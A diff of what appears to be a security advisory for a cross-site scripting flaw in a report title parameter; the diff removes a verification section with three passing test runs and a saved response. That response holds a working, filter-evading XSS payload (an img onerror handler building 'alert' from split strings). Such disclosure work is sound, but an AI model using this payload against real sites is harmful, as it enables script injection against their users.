@@ -44,22 +44,6 @@ blade-auth: bearer <JWT>
 
 Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.
 
-## Fresh verification evidence
-
-| Run | Marker | Observation | Result |
-| --- | --- | --- | --- |
-| 1 | `t2a / u1a` | raw IMG in title | **PASS** |
-| 2 | `t2b / u1b` | raw IMG in title | **PASS** |
-| 3 | `t2c / u1c` | raw IMG in title | **PASS** |
-
-```text
-Saved run-3 _title response:
-<title></title><img src=x onerror=self[`al`+`ert`](`gt48261022t2c`)>-ureport</title>
-
-The fallback _u response contains the equivalent gt48261022u1c marker.
-```
-
-The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.
 
 ## Confirmed source and Sink
 
